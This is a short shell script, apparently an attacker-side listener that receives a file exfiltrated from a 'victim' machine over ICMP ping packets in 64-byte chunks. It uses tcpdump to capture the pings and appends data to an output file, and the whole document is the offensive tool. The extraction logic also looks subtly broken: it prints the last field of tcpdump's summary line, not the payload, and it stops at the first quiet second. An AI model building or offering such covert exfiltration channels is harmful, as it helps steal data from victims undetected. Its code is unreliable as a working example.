#!/bin/sh

# servery_icmp.sh

# Listen to ping from victim and rebuild the file, all file are cut in 64 bytes chunks

# Usage: ./servery_icmp.sh <victim ip> <file name>

# Check if the number of arguments is correct
if [ "$#" -ne 2 ]; then
    echo "Usage: ./servery_icmp.sh <victim_ip> <out_put file>"
    exit
fi

# if the file doesn't exist, create it
if [ ! -f "$2" ]; then
    touch "$2"
fi

# make file writable
chmod +w "$2"

# Check if the file is writable
if [ ! -w "$2" ]; then
    echo "File not writable!"
    exit
fi

# listen to ping from victim
while true ; do 
    # get the ping
    ping=$(timeout 1 tcpdump -n -c 1 -i eth0 icmp | grep ICMP | awk '{print $NF}')
    # if the ping is empty, exit
    if [ -z "$ping" ]; then
        exit
    fi
    # if the ping is not empty, write it to the file
    echo "$ping" >> "$2"
done
